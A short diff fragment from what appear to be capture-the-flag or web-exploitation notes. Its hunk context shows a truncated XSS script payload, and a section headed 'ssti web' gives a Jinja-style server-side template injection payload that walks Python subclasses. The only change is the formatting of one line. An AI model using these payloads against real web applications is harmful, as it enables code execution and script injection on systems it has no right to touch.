@@ -35,7 +35,7 @@ reamb<script>let uuid; for (let a of document.querySelectorAll("a")) { if(a.text
 ```
 
 2. ssti web
-> payload should be no longer than 48 chars. 
+ payload should be no longer than 48 chars. 
  sample payloads. 
 http://localhost/ssti?query={{g.__class__.__base__.__subclasses__()[92]}}
 
